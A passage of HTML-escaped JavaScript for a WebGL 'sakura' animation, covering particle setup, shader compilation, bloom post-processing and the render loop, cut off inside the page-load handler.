m[7] &#x3D; 0.0;\n\n        m[8] &#x3D; sidev.z;\n        m[9] &#x3D; topv.z;\n        m[10] &#x3D; frontv.z;\n        m[11] &#x3D; 0.0;\n\n        m[12] &#x3D; -(vpos.x * m[0] + vpos.y * m[4] + vpos.z * m[8]);\n        m[13] &#x3D; -(vpos.x * m[1] + vpos.y * m[5] + vpos.z * m[9]);\n        m[14] &#x3D; -(vpos.x * m[2] + vpos.y * m[6] + vpos.z * m[10]);\n        m[15] &#x3D; 1.0;\n    &#125;;\n\n    &#x2F;&#x2F;\n    var timeInfo &#x3D; &#123;\n        &#39;start&#39;:0, &#39;prev&#39;:0, &#x2F;&#x2F; Date\n        &#39;delta&#39;:0, &#39;elapsed&#39;:0 &#x2F;&#x2F; Number(sec)\n    &#125;;\n\n    &#x2F;&#x2F;\n    var gl;\n    var renderSpec &#x3D; &#123;\n        &#39;width&#39;:0,\n        &#39;height&#39;:0,\n        &#39;aspect&#39;:1,\n        &#39;array&#39;:new Float32Array(3),\n        &#39;halfWidth&#39;:0,\n        &#39;halfHeight&#39;:0,\n        &#39;halfArray&#39;:new Float32Array(3)\n        &#x2F;&#x2F; and some render targets. see setViewport()\n    &#125;;\n    renderSpec.setSize &#x3D; function(w, h) &#123;\n        renderSpec.width &#x3D; w;\n        renderSpec.height &#x3D; h;\n        renderSpec.aspect &#x3D; renderSpec.width &#x2F; renderSpec.height;\n        renderSpec.array[0] &#x3D; renderSpec.width;\n        renderSpec.array[1] &#x3D; renderSpec.height;\n        renderSpec.array[2] &#x3D; renderSpec.aspect;\n\n        renderSpec.halfWidth &#x3D; Math.floor(w &#x2F; 2);\n        renderSpec.halfHeight &#x3D; Math.floor(h &#x2F; 2);\n        renderSpec.halfArray[0] &#x3D; renderSpec.halfWidth;\n        renderSpec.halfArray[1] &#x3D; renderSpec.halfHeight;\n        renderSpec.halfArray[2] &#x3D; renderSpec.halfWidth &#x2F; renderSpec.halfHeight;\n    &#125;;\n\n    function deleteRenderTarget(rt) &#123;\n        gl.deleteFramebuffer(rt.frameBuffer);\n        gl.deleteRenderbuffer(rt.renderBuffer);\n        gl.deleteTexture(rt.texture);\n    &#125;\n\n    function createRenderTarget(w, h) &#123;\n        var ret &#x3D; &#123;\n            &#39;width&#39;:w,\n            &#39;height&#39;:h,\n            &#39;sizeArray&#39;:new Float32Array([w, h, w &#x2F; h]),\n            &#39;dtxArray&#39;:new Float32Array([1.0 &#x2F; w, 1.0 &#x2F; h])\n        &#125;;\n        ret.frameBuffer &#x3D; gl.createFramebuffer();\n        ret.renderBuffer &#x3D; gl.createRenderbuffer();\n        ret.texture &#x3D; gl.createTexture();\n\n        gl.bindTexture(gl.TEXTURE_2D, ret.texture);\n        gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, w, h, 0, gl.RGBA, gl.UNSIGNED_BYTE, null);\n        gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_WRAP_S, gl.CLAMP_TO_EDGE);\n        gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_WRAP_T, gl.CLAMP_TO_EDGE);\n        gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_MAG_FILTER, gl.LINEAR);\n        gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_MIN_FILTER, gl.LINEAR);\n\n        gl.bindFramebuffer(gl.FRAMEBUFFER, ret.frameBuffer);\n        gl.framebufferTexture2D(gl.FRAMEBUFFER, gl.COLOR_ATTACHMENT0, gl.TEXTURE_2D, ret.texture, 0);\n\n        gl.bindRenderbuffer(gl.RENDERBUFFER, ret.renderBuffer);\n        gl.renderbufferStorage(gl.RENDERBUFFER, gl.DEPTH_COMPONENT16, w, h);\n        gl.framebufferRenderbuffer(gl.FRAMEBUFFER, gl.DEPTH_ATTACHMENT, gl.RENDERBUFFER, ret.renderBuffer);\n\n        gl.bindTexture(gl.TEXTURE_2D, null);\n        gl.bindRenderbuffer(gl.RENDERBUFFER, null);\n        gl.bindFramebuffer(gl.FRAMEBUFFER, null);\n\n        return ret;\n    &#125;\n\n    function compileShader(shtype, shsrc) &#123;\n        var retsh &#x3D; gl.createShader(shtype);\n\n        gl.shaderSource(retsh, shsrc);\n        gl.compileShader(retsh);\n\n        if(!gl.getShaderParameter(retsh, gl.COMPILE_STATUS)) &#123;\n            var errlog &#x3D; gl.getShaderInfoLog(retsh);\n            gl.deleteShader(retsh);\n            console.error(errlog);\n            return null;\n        &#125;\n        return retsh;\n    &#125;\n\n    function createShader(vtxsrc, frgsrc, uniformlist, attrlist) &#123;\n        var vsh &#x3D; compileShader(gl.VERTEX_SHADER, vtxsrc);\n        var fsh &#x3D; compileShader(gl.FRAGMENT_SHADER, frgsrc);\n\n        if(vsh &#x3D;&#x3D; null || fsh &#x3D;&#x3D; null) &#123;\n            return null;\n        &#125;\n\n        var prog &#x3D; gl.createProgram();\n        gl.attachShader(prog, vsh);\n        gl.attachShader(prog, fsh);\n\n        gl.deleteShader(vsh);\n        gl.deleteShader(fsh);\n\n        gl.linkProgram(prog);\n        if (!gl.getProgramParameter(prog, gl.LINK_STATUS)) &#123;\n            var errlog &#x3D; gl.getProgramInfoLog(prog);\n            console.error(errlog);\n            return null;\n        &#125;\n\n        if(uniformlist) &#123;\n            prog.uniforms &#x3D; &#123;&#125;;\n            for(var i &#x3D; 0; i &lt; uniformlist.length; i++) &#123;\n                prog.uniforms[uniformlist[i]] &#x3D; gl.getUniformLocation(prog, uniformlist[i]);\n            &#125;\n        &#125;\n\n        if(attrlist) &#123;\n            prog.attributes &#x3D; &#123;&#125;;\n            for(var i &#x3D; 0; i &lt; attrlist.length; i++) &#123;\n                var attr &#x3D; attrlist[i];\n                prog.attributes[attr] &#x3D; gl.getAttribLocation(prog, attr);\n            &#125;\n        &#125;\n\n        return prog;\n    &#125;\n\n    function useShader(prog) &#123;\n        gl.useProgram(prog);\n        for(var attr in prog.attributes) &#123;\n            gl.enableVertexAttribArray(prog.attributes[attr]);;\n        &#125;\n    &#125;\n\n    function unuseShader(prog) &#123;\n        for(var attr in prog.attributes) &#123;\n            gl.disableVertexAttribArray(prog.attributes[attr]);;\n        &#125;\n        gl.useProgram(null);\n    &#125;\n\n    &#x2F;&#x2F;&#x2F;&#x2F;&#x2F;\n    var projection &#x3D; &#123;\n        &#39;angle&#39;:60,\n        &#39;nearfar&#39;:new Float32Array([0.1, 100.0]),\n        &#39;matrix&#39;:Matrix44.createIdentity()\n    &#125;;\n    var camera &#x3D; &#123;\n        &#39;position&#39;:Vector3.create(0, 0, 100),\n        &#39;lookat&#39;:Vector3.create(0, 0, 0),\n        &#39;up&#39;:Vector3.create(0, 1, 0),\n        &#39;dof&#39;:Vector3.create(10.0, 4.0, 8.0),\n        &#39;matrix&#39;:Matrix44.createIdentity()\n    &#125;;\n\n    var pointFlower &#x3D; &#123;&#125;;\n    var meshFlower &#x3D; &#123;&#125;;\n    var sceneStandBy &#x3D; false;\n\n    var BlossomParticle &#x3D; function () &#123;\n        this.velocity &#x3D; new Array(3);\n        this.rotation &#x3D; new Array(3);\n        this.position &#x3D; new Array(3);\n        this.euler &#x3D; new Array(3);\n        this.size &#x3D; 1.0;\n        this.alpha &#x3D; 1.0;\n        this.zkey &#x3D; 0.0;\n    &#125;;\n\n    BlossomParticle.prototype.setVelocity &#x3D; function (vx, vy, vz) &#123;\n        this.velocity[0] &#x3D; vx;\n        this.velocity[1] &#x3D; vy;\n        this.velocity[2] &#x3D; vz;\n    &#125;;\n\n    BlossomParticle.prototype.setRotation &#x3D; function (rx, ry, rz) &#123;\n        this.rotation[0] &#x3D; rx;\n        this.rotation[1] &#x3D; ry;\n        this.rotation[2] &#x3D; rz;\n    &#125;;\n\n    BlossomParticle.prototype.setPosition &#x3D; function (nx, ny, nz) &#123;\n        this.position[0] &#x3D; nx;\n        this.position[1] &#x3D; ny;\n        this.position[2] &#x3D; nz;\n    &#125;;\n\n    BlossomParticle.prototype.setEulerAngles &#x3D; function (rx, ry, rz) &#123;\n        this.euler[0] &#x3D; rx;\n        this.euler[1] &#x3D; ry;\n        this.euler[2] &#x3D; rz;\n    &#125;;\n\n    BlossomParticle.prototype.setSize &#x3D; function (s) &#123;\n        this.size &#x3D; s;\n    &#125;;\n\n    BlossomParticle.prototype.update &#x3D; function (dt, et) &#123;\n        this.position[0] +&#x3D; this.velocity[0] * dt;\n        this.position[1] +&#x3D; this.velocity[1] * dt;\n        this.position[2] +&#x3D; this.velocity[2] * dt;\n\n        this.euler[0] +&#x3D; this.rotation[0] * dt;\n        this.euler[1] +&#x3D; this.rotation[1] * dt;\n        this.euler[2] +&#x3D; this.rotation[2] * dt;\n    &#125;;\n\n    function createPointFlowers() &#123;\n        &#x2F;&#x2F; get point sizes\n        var prm &#x3D; gl.getParameter(gl.ALIASED_POINT_SIZE_RANGE);\n        renderSpec.pointSize &#x3D; &#123;&#39;min&#39;:prm[0], &#39;max&#39;:prm[1]&#125;;\n\n        var vtxsrc &#x3D; document.getElementById(&quot;sakura_point_vsh&quot;).textContent;\n        var frgsrc &#x3D; document.getElementById(&quot;sakura_point_fsh&quot;).textContent;\n\n        pointFlower.program &#x3D; createShader(\n            vtxsrc, frgsrc,\n            [&#39;uProjection&#39;, &#39;uModelview&#39;, &#39;uResolution&#39;, &#39;uOffset&#39;, &#39;uDOF&#39;, &#39;uFade&#39;],\n            [&#39;aPosition&#39;, &#39;aEuler&#39;, &#39;aMisc&#39;]\n        );\n\n        useShader(pointFlower.program);\n        pointFlower.offset &#x3D; new Float32Array([0.0, 0.0, 0.0]);\n        pointFlower.fader &#x3D; Vector3.create(0.0, 10.0, 0.0);\n\n        &#x2F;&#x2F; paramerters: velocity[3], rotate[3]\n        pointFlower.numFlowers &#x3D; 1600;\n        pointFlower.particles &#x3D; new Array(pointFlower.numFlowers);\n        &#x2F;&#x2F; vertex attributes &#123;position[3], euler_xyz[3], size[1]&#125;\n        pointFlower.dataArray &#x3D; new Float32Array(pointFlower.numFlowers * (3 + 3 + 2));\n        pointFlower.positionArrayOffset &#x3D; 0;\n        pointFlower.eulerArrayOffset &#x3D; pointFlower.numFlowers * 3;\n        pointFlower.miscArrayOffset &#x3D; pointFlower.numFlowers * 6;\n\n        pointFlower.buffer &#x3D; gl.createBuffer();\n        gl.bindBuffer(gl.ARRAY_BUFFER, pointFlower.buffer);\n        gl.bufferData(gl.ARRAY_BUFFER, pointFlower.dataArray, gl.DYNAMIC_DRAW);\n        gl.bindBuffer(gl.ARRAY_BUFFER, null);\n\n        unuseShader(pointFlower.program);\n\n        for(var i &#x3D; 0; i &lt; pointFlower.numFlowers; i++) &#123;\n            pointFlower.particles[i] &#x3D; new BlossomParticle();\n        &#125;\n    &#125;\n\n    function initPointFlowers() &#123;\n        &#x2F;&#x2F;area\n        pointFlower.area &#x3D; Vector3.create(20.0, 20.0, 20.0);\n        pointFlower.area.x &#x3D; pointFlower.area.y * renderSpec.aspect;\n\n        pointFlower.fader.x &#x3D; 10.0; &#x2F;&#x2F;env fade start\n        pointFlower.fader.y &#x3D; pointFlower.area.z; &#x2F;&#x2F;env fade half\n        pointFlower.fader.z &#x3D; 0.1;  &#x2F;&#x2F;near fade start\n\n        &#x2F;&#x2F;particles\n        var PI2 &#x3D; Math.PI * 2.0;\n        var tmpv3 &#x3D; Vector3.create(0, 0, 0);\n        var tmpv &#x3D; 0;\n        var symmetryrand &#x3D; function() &#123;return (Math.random() * 2.0 - 1.0);&#125;;\n        for(var i &#x3D; 0; i &lt; pointFlower.numFlowers; i++) &#123;\n            var tmpprtcl &#x3D; pointFlower.particles[i];\n\n            &#x2F;&#x2F;velocity\n            tmpv3.x &#x3D; symmetryrand() * 0.3 + 0.8;\n            tmpv3.y &#x3D; symmetryrand() * 0.2 - 1.0;\n            tmpv3.z &#x3D; symmetryrand() * 0.3 + 0.5;\n            Vector3.normalize(tmpv3);\n            tmpv &#x3D; 2.0 + Math.random() * 1.0;\n            tmpprtcl.setVelocity(tmpv3.x * tmpv, tmpv3.y * tmpv, tmpv3.z * tmpv);\n\n            &#x2F;&#x2F;rotation\n            tmpprtcl.setRotation(\n                symmetryrand() * PI2 * 0.5,\n                symmetryrand() * PI2 * 0.5,\n                symmetryrand() * PI2 * 0.5\n            );\n\n            &#x2F;&#x2F;position\n            tmpprtcl.setPosition(\n                symmetryrand() * pointFlower.area.x,\n                symmetryrand() * pointFlower.area.y,\n                symmetryrand() * pointFlower.area.z\n            );\n\n            &#x2F;&#x2F;euler\n            tmpprtcl.setEulerAngles(\n                Math.random() * Math.PI * 2.0,\n                Math.random() * Math.PI * 2.0,\n                Math.random() * Math.PI * 2.0\n            );\n\n            &#x2F;&#x2F;size\n            tmpprtcl.setSize(0.9 + Math.random() * 0.1);\n        &#125;\n    &#125;\n\n    function renderPointFlowers() &#123;\n        &#x2F;&#x2F;update\n        var PI2 &#x3D; Math.PI * 2.0;\n        var limit &#x3D; [pointFlower.area.x, pointFlower.area.y, pointFlower.area.z];\n        var repeatPos &#x3D; function (prt, cmp, limit) &#123;\n            if(Math.abs(prt.position[cmp]) - prt.size * 0.5 &gt; limit) &#123;\n                &#x2F;&#x2F;out of area\n                if(prt.position[cmp] &gt; 0) &#123;\n                    prt.position[cmp] -&#x3D; limit * 2.0;\n                &#125;\n                else &#123;\n                    prt.position[cmp] +&#x3D; limit * 2.0;\n                &#125;\n            &#125;\n        &#125;;\n        var repeatEuler &#x3D; function (prt, cmp) &#123;\n            prt.euler[cmp] &#x3D; prt.euler[cmp] % PI2;\n            if(prt.euler[cmp] &lt; 0.0) &#123;\n                prt.euler[cmp] +&#x3D; PI2;\n            &#125;\n        &#125;;\n\n        for(var i &#x3D; 0; i &lt; pointFlower.numFlowers; i++) &#123;\n            var prtcl &#x3D; pointFlower.particles[i];\n            prtcl.update(timeInfo.delta, timeInfo.elapsed);\n            repeatPos(prtcl, 0, pointFlower.area.x);\n            repeatPos(prtcl, 1, pointFlower.area.y);\n            repeatPos(prtcl, 2, pointFlower.area.z);\n            repeatEuler(prtcl, 0);\n            repeatEuler(prtcl, 1);\n            repeatEuler(prtcl, 2);\n\n            prtcl.alpha &#x3D; 1.0;&#x2F;&#x2F;(pointFlower.area.z - prtcl.position[2]) * 0.5;\n\n            prtcl.zkey &#x3D; (camera.matrix[2] * prtcl.position[0]\n                + camera.matrix[6] * prtcl.position[1]\n                + camera.matrix[10] * prtcl.position[2]\n                + camera.matrix[14]);\n        &#125;\n\n        &#x2F;&#x2F; sort\n        pointFlower.particles.sort(function(p0, p1)&#123;return p0.zkey - p1.zkey;&#125;);\n\n        &#x2F;&#x2F; update data\n        var ipos &#x3D; pointFlower.positionArrayOffset;\n        var ieuler &#x3D; pointFlower.eulerArrayOffset;\n        var imisc &#x3D; pointFlower.miscArrayOffset;\n        for(var i &#x3D; 0; i &lt; pointFlower.numFlowers; i++) &#123;\n            var prtcl &#x3D; pointFlower.particles[i];\n            pointFlower.dataArray[ipos] &#x3D; prtcl.position[0];\n            pointFlower.dataArray[ipos + 1] &#x3D; prtcl.position[1];\n            pointFlower.dataArray[ipos + 2] &#x3D; prtcl.position[2];\n            ipos +&#x3D; 3;\n            pointFlower.dataArray[ieuler] &#x3D; prtcl.euler[0];\n            pointFlower.dataArray[ieuler + 1] &#x3D; prtcl.euler[1];\n            pointFlower.dataArray[ieuler + 2] &#x3D; prtcl.euler[2];\n            ieuler +&#x3D; 3;\n            pointFlower.dataArray[imisc] &#x3D; prtcl.size;\n            pointFlower.dataArray[imisc + 1] &#x3D; prtcl.alpha;\n            imisc +&#x3D; 2;\n        &#125;\n\n        &#x2F;&#x2F;draw\n        gl.enable(gl.BLEND);\n        &#x2F;&#x2F;gl.disable(gl.DEPTH_TEST);\n        gl.blendFunc(gl.SRC_ALPHA, gl.ONE_MINUS_SRC_ALPHA);\n\n        var prog &#x3D; pointFlower.program;\n        useShader(prog);\n\n        gl.uniformMatrix4fv(prog.uniforms.uProjection, false, projection.matrix);\n        gl.uniformMatrix4fv(prog.uniforms.uModelview, false, camera.matrix);\n        gl.uniform3fv(prog.uniforms.uResolution, renderSpec.array);\n        gl.uniform3fv(prog.uniforms.uDOF, Vector3.arrayForm(camera.dof));\n        gl.uniform3fv(prog.uniforms.uFade, Vector3.arrayForm(pointFlower.fader));\n\n        gl.bindBuffer(gl.ARRAY_BUFFER, pointFlower.buffer);\n        gl.bufferData(gl.ARRAY_BUFFER, pointFlower.dataArray, gl.DYNAMIC_DRAW);\n\n        gl.vertexAttribPointer(prog.attributes.aPosition, 3, gl.FLOAT, false, 0, pointFlower.positionArrayOffset * Float32Array.BYTES_PER_ELEMENT);\n        gl.vertexAttribPointer(prog.attributes.aEuler, 3, gl.FLOAT, false, 0, pointFlower.eulerArrayOffset * Float32Array.BYTES_PER_ELEMENT);\n        gl.vertexAttribPointer(prog.attributes.aMisc, 2, gl.FLOAT, false, 0, pointFlower.miscArrayOffset * Float32Array.BYTES_PER_ELEMENT);\n\n        &#x2F;&#x2F; doubler\n        for(var i &#x3D; 1; i &lt; 2; i++) &#123;\n            var zpos &#x3D; i * -2.0;\n            pointFlower.offset[0] &#x3D; pointFlower.area.x * -1.0;\n            pointFlower.offset[1] &#x3D; pointFlower.area.y * -1.0;\n            pointFlower.offset[2] &#x3D; pointFlower.area.z * zpos;\n            gl.uniform3fv(prog.uniforms.uOffset, pointFlower.offset);\n            gl.drawArrays(gl.POINT, 0, pointFlower.numFlowers);\n\n            pointFlower.offset[0] &#x3D; pointFlower.area.x * -1.0;\n            pointFlower.offset[1] &#x3D; pointFlower.area.y *  1.0;\n            pointFlower.offset[2] &#x3D; pointFlower.area.z * zpos;\n            gl.uniform3fv(prog.uniforms.uOffset, pointFlower.offset);\n            gl.drawArrays(gl.POINT, 0, pointFlower.numFlowers);\n\n            pointFlower.offset[0] &#x3D; pointFlower.area.x *  1.0;\n            pointFlower.offset[1] &#x3D; pointFlower.area.y * -1.0;\n            pointFlower.offset[2] &#x3D; pointFlower.area.z * zpos;\n            gl.uniform3fv(prog.uniforms.uOffset, pointFlower.offset);\n            gl.drawArrays(gl.POINT, 0, pointFlower.numFlowers);\n\n            pointFlower.offset[0] &#x3D; pointFlower.area.x *  1.0;\n            pointFlower.offset[1] &#x3D; pointFlower.area.y *  1.0;\n            pointFlower.offset[2] &#x3D; pointFlower.area.z * zpos;\n            gl.uniform3fv(prog.uniforms.uOffset, pointFlower.offset);\n            gl.drawArrays(gl.POINT, 0, pointFlower.numFlowers);\n        &#125;\n\n        &#x2F;&#x2F;main\n        pointFlower.offset[0] &#x3D; 0.0;\n        pointFlower.offset[1] &#x3D; 0.0;\n        pointFlower.offset[2] &#x3D; 0.0;\n        gl.uniform3fv(prog.uniforms.uOffset, pointFlower.offset);\n        gl.drawArrays(gl.POINT, 0, pointFlower.numFlowers);\n\n        gl.bindBuffer(gl.ARRAY_BUFFER, null);\n        unuseShader(prog);\n\n        gl.enable(gl.DEPTH_TEST);\n        gl.disable(gl.BLEND);\n    &#125;\n\n    &#x2F;&#x2F; effects\n    &#x2F;&#x2F;common util\n    function createEffectProgram(vtxsrc, frgsrc, exunifs, exattrs) &#123;\n        var ret &#x3D; &#123;&#125;;\n        var unifs &#x3D; [&#39;uResolution&#39;, &#39;uSrc&#39;, &#39;uDelta&#39;];\n        if(exunifs) &#123;\n            unifs &#x3D; unifs.concat(exunifs);\n        &#125;\n        var attrs &#x3D; [&#39;aPosition&#39;];\n        if(exattrs) &#123;\n            attrs &#x3D; attrs.concat(exattrs);\n        &#125;\n\n        ret.program &#x3D; createShader(vtxsrc, frgsrc, unifs, attrs);\n        useShader(ret.program);\n\n        ret.dataArray &#x3D; new Float32Array([\n            -1.0, -1.0,\n            1.0, -1.0,\n            -1.0,  1.0,\n            1.0,  1.0\n        ]);\n        ret.buffer &#x3D; gl.createBuffer();\n        gl.bindBuffer(gl.ARRAY_BUFFER, ret.buffer);\n        gl.bufferData(gl.ARRAY_BUFFER, ret.dataArray, gl.STATIC_DRAW);\n\n        gl.bindBuffer(gl.ARRAY_BUFFER, null);\n        unuseShader(ret.program);\n\n        return ret;\n    &#125;\n\n    &#x2F;&#x2F; basic usage\n    &#x2F;&#x2F; useEffect(prog, srctex(&#123;&#39;texture&#39;:texid, &#39;dtxArray&#39;:(f32)[dtx, dty]&#125;)); &#x2F;&#x2F;basic initialize\n    &#x2F;&#x2F; gl.uniform**(...); &#x2F;&#x2F;additional uniforms\n    &#x2F;&#x2F; drawEffect()\n    &#x2F;&#x2F; unuseEffect(prog)\n    &#x2F;&#x2F; TEXTURE0 makes src\n    function useEffect(fxobj, srctex) &#123;\n        var prog &#x3D; fxobj.program;\n        useShader(prog);\n        gl.uniform3fv(prog.uniforms.uResolution, renderSpec.array);\n\n        if(srctex !&#x3D; null) &#123;\n            gl.uniform2fv(prog.uniforms.uDelta, srctex.dtxArray);\n            gl.uniform1i(prog.uniforms.uSrc, 0);\n\n            gl.activeTexture(gl.TEXTURE0);\n            gl.bindTexture(gl.TEXTURE_2D, srctex.texture);\n        &#125;\n    &#125;\n    function drawEffect(fxobj) &#123;\n        gl.bindBuffer(gl.ARRAY_BUFFER, fxobj.buffer);\n        gl.vertexAttribPointer(fxobj.program.attributes.aPosition, 2, gl.FLOAT, false, 0, 0);\n        gl.drawArrays(gl.TRIANGLE_STRIP, 0, 4);\n    &#125;\n    function unuseEffect(fxobj) &#123;\n        unuseShader(fxobj.program);\n    &#125;\n\n    var effectLib &#x3D; &#123;&#125;;\n    function createEffectLib() &#123;\n\n        var vtxsrc, frgsrc;\n        &#x2F;&#x2F;common\n        var cmnvtxsrc &#x3D; document.getElementById(&quot;fx_common_vsh&quot;).textContent;\n\n        &#x2F;&#x2F;background\n        frgsrc &#x3D; document.getElementById(&quot;bg_fsh&quot;).textContent;\n        effectLib.sceneBg &#x3D; createEffectProgram(cmnvtxsrc, frgsrc, [&#39;uTimes&#39;], null);\n\n        &#x2F;&#x2F; make brightpixels buffer\n        frgsrc &#x3D; document.getElementById(&quot;fx_brightbuf_fsh&quot;).textContent;\n        effectLib.mkBrightBuf &#x3D; createEffectProgram(cmnvtxsrc, frgsrc, null, null);\n\n        &#x2F;&#x2F; direction blur\n        frgsrc &#x3D; document.getElementById(&quot;fx_dirblur_r4_fsh&quot;).textContent;\n        effectLib.dirBlur &#x3D; createEffectProgram(cmnvtxsrc, frgsrc, [&#39;uBlurDir&#39;], null);\n\n        &#x2F;&#x2F;final composite\n        vtxsrc &#x3D; document.getElementById(&quot;pp_final_vsh&quot;).textContent;\n        frgsrc &#x3D; document.getElementById(&quot;pp_final_fsh&quot;).textContent;\n        effectLib.finalComp &#x3D; createEffectProgram(vtxsrc, frgsrc, [&#39;uBloom&#39;], null);\n    &#125;\n\n    &#x2F;&#x2F; background\n    function createBackground() &#123;\n        &#x2F;&#x2F;console.log(&quot;create background&quot;);\n    &#125;\n    function initBackground() &#123;\n        &#x2F;&#x2F;console.log(&quot;init background&quot;);\n    &#125;\n    function renderBackground() &#123;\n        gl.disable(gl.DEPTH_TEST);\n\n        useEffect(effectLib.sceneBg, null);\n        gl.uniform2f(effectLib.sceneBg.program.uniforms.uTimes, timeInfo.elapsed, timeInfo.delta);\n        drawEffect(effectLib.sceneBg);\n        unuseEffect(effectLib.sceneBg);\n\n        gl.enable(gl.DEPTH_TEST);\n    &#125;\n\n    &#x2F;&#x2F; post process\n    var postProcess &#x3D; &#123;&#125;;\n    function createPostProcess() &#123;\n        &#x2F;&#x2F;console.log(&quot;create post process&quot;);\n    &#125;\n    function initPostProcess() &#123;\n        &#x2F;&#x2F;console.log(&quot;init post process&quot;);\n    &#125;\n\n    function renderPostProcess() &#123;\n        gl.enable(gl.TEXTURE_2D);\n        gl.disable(gl.DEPTH_TEST);\n        var bindRT &#x3D; function (rt, isclear) &#123;\n            gl.bindFramebuffer(gl.FRAMEBUFFER, rt.frameBuffer);\n            gl.viewport(0, 0, rt.width, rt.height);\n            if(isclear) &#123;\n                gl.clearColor(0, 0, 0, 0);\n                gl.clear(gl.COLOR_BUFFER_BIT | gl.DEPTH_BUFFER_BIT);\n            &#125;\n        &#125;;\n\n        &#x2F;&#x2F;make bright buff\n        bindRT(renderSpec.wHalfRT0, true);\n        useEffect(effectLib.mkBrightBuf, renderSpec.mainRT);\n        drawEffect(effectLib.mkBrightBuf);\n        unuseEffect(effectLib.mkBrightBuf);\n\n        &#x2F;&#x2F; make bloom\n        for(var i &#x3D; 0; i &lt; 2; i++) &#123;\n            var p &#x3D; 1.5 + 1 * i;\n            var s &#x3D; 2.0 + 1 * i;\n            bindRT(renderSpec.wHalfRT1, true);\n            useEffect(effectLib.dirBlur, renderSpec.wHalfRT0);\n            gl.uniform4f(effectLib.dirBlur.program.uniforms.uBlurDir, p, 0.0, s, 0.0);\n            drawEffect(effectLib.dirBlur);\n            unuseEffect(effectLib.dirBlur);\n\n            bindRT(renderSpec.wHalfRT0, true);\n            useEffect(effectLib.dirBlur, renderSpec.wHalfRT1);\n            gl.uniform4f(effectLib.dirBlur.program.uniforms.uBlurDir, 0.0, p, 0.0, s);\n            drawEffect(effectLib.dirBlur);\n            unuseEffect(effectLib.dirBlur);\n        &#125;\n\n        &#x2F;&#x2F;display\n        gl.bindFramebuffer(gl.FRAMEBUFFER, null);\n        gl.viewport(0, 0, renderSpec.width, renderSpec.height);\n        gl.clear(gl.COLOR_BUFFER_BIT | gl.DEPTH_BUFFER_BIT);\n\n        useEffect(effectLib.finalComp, renderSpec.mainRT);\n        gl.uniform1i(effectLib.finalComp.program.uniforms.uBloom, 1);\n        gl.activeTexture(gl.TEXTURE1);\n        gl.bindTexture(gl.TEXTURE_2D, renderSpec.wHalfRT0.texture);\n        drawEffect(effectLib.finalComp);\n        unuseEffect(effectLib.finalComp);\n\n        gl.enable(gl.DEPTH_TEST);\n    &#125;\n\n    &#x2F;&#x2F;&#x2F;&#x2F;&#x2F;\n    var SceneEnv &#x3D; &#123;&#125;;\n    function createScene() &#123;\n        createEffectLib();\n        createBackground();\n        createPointFlowers();\n        createPostProcess();\n        sceneStandBy &#x3D; true;\n    &#125;\n\n    function initScene() &#123;\n        initBackground();\n        initPointFlowers();\n        initPostProcess();\n\n        &#x2F;&#x2F;camera.position.z &#x3D; 17.320508;\n        camera.position.z &#x3D; pointFlower.area.z + projection.nearfar[0];\n        projection.angle &#x3D; Math.atan2(pointFlower.area.y, camera.position.z + pointFlower.area.z) * 180.0 &#x2F; Math.PI * 2.0;\n        Matrix44.loadProjection(projection.matrix, renderSpec.aspect, projection.angle, projection.nearfar[0], projection.nearfar[1]);\n    &#125;\n\n    function renderScene() &#123;\n        &#x2F;&#x2F;draw\n        Matrix44.loadLookAt(camera.matrix, camera.position, camera.lookat, camera.up);\n\n        gl.enable(gl.DEPTH_TEST);\n\n        &#x2F;&#x2F;gl.bindFramebuffer(gl.FRAMEBUFFER, null);\n        gl.bindFramebuffer(gl.FRAMEBUFFER, renderSpec.mainRT.frameBuffer);\n        gl.viewport(0, 0, renderSpec.mainRT.width, renderSpec.mainRT.height);\n        gl.clearColor(0.005, 0, 0.05, 0);\n        gl.clear(gl.COLOR_BUFFER_BIT | gl.DEPTH_BUFFER_BIT);\n\n        renderBackground();\n        renderPointFlowers();\n        renderPostProcess();\n    &#125;\n\n    function onResize(e) &#123;\n        makeCanvasFullScreen(document.getElementById(&quot;sakura&quot;));\n        setViewports();\n        if(sceneStandBy) &#123;\n            initScene();\n        &#125;\n    &#125;\n\n    function setViewports() &#123;\n        renderSpec.setSize(gl.canvas.width, gl.canvas.height);\n\n        gl.clearColor(0.2, 0.2, 0.5, 1.0);\n        gl.viewport(0, 0, renderSpec.width, renderSpec.height);\n\n        var rtfunc &#x3D; function (rtname, rtw, rth) &#123;\n            var rt &#x3D; renderSpec[rtname];\n            if(rt) deleteRenderTarget(rt);\n            renderSpec[rtname] &#x3D; createRenderTarget(rtw, rth);\n        &#125;;\n        rtfunc(&#39;mainRT&#39;, renderSpec.width, renderSpec.height);\n        rtfunc(&#39;wFullRT0&#39;, renderSpec.width, renderSpec.height);\n        rtfunc(&#39;wFullRT1&#39;, renderSpec.width, renderSpec.height);\n        rtfunc(&#39;wHalfRT0&#39;, renderSpec.halfWidth, renderSpec.halfHeight);\n        rtfunc(&#39;wHalfRT1&#39;, renderSpec.halfWidth, renderSpec.halfHeight);\n    &#125;\n\n    function render() &#123;\n        renderScene();\n    &#125;\n\n    var animating &#x3D; true;\n\n\n    function stepAnimation() &#123;\n        if(!animating) animate();\n    &#125;\n\n    function animate() &#123;\n        var curdate &#x3D; new Date();\n        timeInfo.elapsed &#x3D; (curdate - timeInfo.start) &#x2F; 1000.0;\n        timeInfo.delta &#x3D; (curdate - timeInfo.prev) &#x2F; 1000.0;\n        timeInfo.prev &#x3D; curdate;\n\n        if(animating) requestAnimationFrame(animate);\n        render();\n    &#125;\n\n    function makeCanvasFullScreen(canvas) &#123;\n        var b &#x3D; document.body;\n        var d &#x3D; document.documentElement;\n        var fullw &#x3D; Math.max(b.clientWidth , b.scrollWidth, d.scrollWidth, d.clientWidth);\n        var fullh &#x3D; Math.max(b.clientHeight , b.scrollHeight, d.scrollHeight, d.clientHeight);\n        canvas.width &#x3D; fullw;\n        canvas.height &#x3D; fullh;\n    &#125;\n\n    window.addEventListener(&#39;load&#39;, function(e) &#123;\n        var canvas &#x3D; document.getElementById(&quot;sakura&quot;);\n        try &#123;\n            makeCanvasFullScreen(canvas);\n            gl &#x3D; canvas.getContext(&#39;experimental-webgl&#39;);\n        &#125; catch(e) &#123;\n            alert(&quot;WebGL not supported.&quot; + e);\n            console.error(e);\n            return;\n        &#125;\n\n        window.addEventListener(&#39;resize&#39;, onResize);\n\n        setViewports();\n        